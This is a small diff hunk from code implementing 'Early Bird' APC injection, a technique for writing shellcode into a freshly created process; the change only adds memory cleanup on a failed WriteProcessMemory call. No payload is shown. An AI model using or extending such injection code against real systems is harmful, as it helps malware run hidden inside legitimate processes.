@@ -45,6 +45,7 @@ BOOL EarlyBirdAPCInjection() {
 	}
 
 	if (!WriteProcessMemory(pi.hProcess, lpApcFunc, shellcode, sizeof(shellcode), nullptr)) {
+		VirtualFreeEx(pi.hProcess, lpApcFunc, 0, MEM_RELEASE);
 		CloseHandle(pi.hThread);
 		CloseHandle(pi.hProcess);
 		return FALSE;
